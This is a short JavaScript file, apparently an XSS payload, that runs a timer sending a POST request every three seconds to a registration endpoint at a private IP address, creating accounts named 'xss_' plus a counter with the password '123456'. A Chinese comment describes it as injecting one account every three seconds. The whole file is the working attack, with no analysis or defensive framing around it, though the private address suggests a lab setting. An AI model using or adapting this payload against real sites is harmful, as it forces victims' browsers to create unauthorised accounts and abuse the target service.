let counter = 0;

function injectAccount() {
    const xhr = new XMLHttpRequest();
    const username = 'xss_' + counter;
    const password = '123456';

    const params = `new_account=${encodeURIComponent(username)}&new_password=${encodeURIComponent(password)}`;
    xhr.open('POST', 'http://192.168.160.242:5000/register', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send(params);

    counter++;
    console.log("Injected:", username);
}

// 每 3 秒注入一个账号
setInterval(injectAccount, 3000);